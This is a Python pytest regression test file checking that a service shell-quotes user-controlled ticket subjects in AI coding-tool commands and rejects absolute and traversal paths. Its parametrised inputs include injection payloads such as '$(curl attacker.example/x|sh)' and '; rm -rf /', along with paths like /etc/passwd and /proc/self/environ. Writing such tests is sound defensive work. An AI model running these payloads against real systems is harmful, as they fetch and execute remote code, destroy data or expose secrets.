"""Regression tests for GAP-0095 (analysis-prompt command injection) and
GAP-0096 (absolute / traversal path not rejected) in
``app/services/agent_architect.py``.

Offline / no AWS / no command execution: exercises the pure validation and
command-builder functions directly.

GAP-0095:
  ``build_architect_workflow`` builds the ``analyze_feature`` step command by
  interpolating the analysis prompt — which embeds the user-controlled ticket
  subject — into a ``claude -p "..."`` / ``codex -q "..."`` shell string.
  A subject containing ``"`` / ``$()`` / backticks must be neutralised: the
  prompt must collapse into a single shlex token, never extra shell words.

GAP-0096:
  ``validate_architect_config`` rejected ``..`` traversal but accepted absolute
  paths (``/etc/passwd``), tilde paths, and Windows backslash/drive paths in
  ``scan_paths`` / ``reference_docs`` before they were spliced into
  ``find ...`` / ``cat ...`` shell commands.

Fails-before / passes-after:
- The injection payload in the ticket subject is shlex-quoted into exactly one
  token in the analyze command.
- An absolute (or ``..``) scan path produces a validation error.
"""

import shlex

import pytest

from app.services.agent_architect import (
    _is_safe_path,
    validate_architect_config,
    build_architect_workflow,
)

BASE_CONFIG = {
    "repo_url": "https://github.com/example/repo",
    "repo_branch": "main",
    "reference_docs": ["docs/README.md"],
    "scan_paths": ["app/services/"],
}


# ---------------------------------------------------------------------------
# GAP-0095 — analysis prompt command injection
# ---------------------------------------------------------------------------

_INJECTION_SUBJECTS = [
    'Add OAuth support" $(curl attacker.example/x|sh)',
    "Fix bug `id`",
    "Feature $(reboot)",
    'Add "double" quotes',
    "End quote\" ; rm -rf / #",
]


def _analyze_cmd(config, subject):
    wf = build_architect_workflow(
        agent_run_id="t",
        config=config,
        ticket={"ticket_id": "T-1", "subject": subject},
    )
    step = next(s for s in wf["steps"] if s["type"] == "analyze_feature")
    return step["command"]


@pytest.mark.parametrize("subject", _INJECTION_SUBJECTS)
@pytest.mark.parametrize("coding_tool", ["claude_code", "codex"])
def test_analyze_cmd_neutralizes_subject_injection(coding_tool, subject):
    cfg = {**BASE_CONFIG, "coding_tool": coding_tool}
    cmd = _analyze_cmd(cfg, subject)

    # Must tokenize without unbalanced-quote errors (would raise pre-fix when a
    # subject `"` prematurely terminates the double-quoted prompt argument).
    tokens = shlex.split(cmd)

    # No shell operators survive as separate tokens.
    assert not any(t in (";", "&&", "||", "|", "&") for t in tokens), tokens

    # The prompt (and thus the injection payload) is a single discrete token
    # following the -p / -q flag.
    flag = "-q" if coding_tool == "codex" else "-p"
    assert flag in tokens, tokens
    prompt_tok = tokens[tokens.index(flag) + 1]
    # The raw subject text lives intact inside that one token, not split out.
    assert subject in prompt_tok, prompt_tok
    # And it is genuinely a single token (the whole payload is in one element).
    assert "$(" not in tokens or all("$(" not in t for t in tokens if t != prompt_tok)


def test_analyze_cmd_preserves_benign_subject():
    cmd = _analyze_cmd({**BASE_CONFIG, "coding_tool": "claude_code"}, "Add user profile page")
    tokens = shlex.split(cmd)
    assert tokens[0] == "claude"
    assert "-p" in tokens
    prompt_tok = tokens[tokens.index("-p") + 1]
    assert "Add user profile page" in prompt_tok


# ---------------------------------------------------------------------------
# GAP-0096 — absolute / traversal path rejection
# ---------------------------------------------------------------------------

_UNSAFE_PATHS = [
    "/etc/passwd",
    "/proc/self/environ",
    "~/secrets",
    "../../../etc",
    "app/../../../etc",
    "app\\services",
    "C:\\Users\\x",
    "app:services",
]

_SAFE_PATHS = [
    "app/services/foo.py",
    "frontend/src/pages/",
    "docs/CHANGELOG..md",  # ".." as filename fragment, not a segment
]


@pytest.mark.parametrize("path", _UNSAFE_PATHS)
def test_is_safe_path_rejects(path):
    assert _is_safe_path(path) is False


@pytest.mark.parametrize("path", _SAFE_PATHS)
def test_is_safe_path_accepts(path):
    assert _is_safe_path(path) is True


@pytest.mark.parametrize("path", _UNSAFE_PATHS)
def test_validate_rejects_unsafe_scan_path(path):
    errors = validate_architect_config({**BASE_CONFIG, "scan_paths": [path]})
    assert any(str(path) in e and "path" in e.lower() for e in errors), errors


@pytest.mark.parametrize("path", _UNSAFE_PATHS)
def test_validate_rejects_unsafe_reference_doc(path):
    errors = validate_architect_config({**BASE_CONFIG, "reference_docs": [path]})
    assert any(str(path) in e and "path" in e.lower() for e in errors), errors


def test_validate_accepts_safe_relative_paths():
    cfg = {**BASE_CONFIG, "scan_paths": ["app/services/", "frontend/src/"]}
    errors = validate_architect_config(cfg)
    assert [e for e in errors if "path" in e.lower()] == []


def test_workflow_filters_unsafe_paths_from_commands():
    """Defence-in-depth: even a stale config with absolute paths must not leak
    them into the scan/read shell commands."""
    cfg = {
        **BASE_CONFIG,
        "scan_paths": ["/etc/passwd", "app/services/"],
        "reference_docs": ["/proc/self/environ", "docs/README.md"],
    }
    wf = build_architect_workflow(
        agent_run_id="t", config=cfg, ticket={"ticket_id": "T-1", "subject": "x"}
    )
    scan = next(s for s in wf["steps"] if s["type"] == "scan_codebase")["command"]
    read = next(s for s in wf["steps"] if s["type"] == "read_reference_docs")["command"]
    assert "/etc/passwd" not in (scan or "")
    assert "app/services/" in (scan or "")
    assert "/proc/self/environ" not in (read or "")
    assert "docs/README.md" in (read or "")
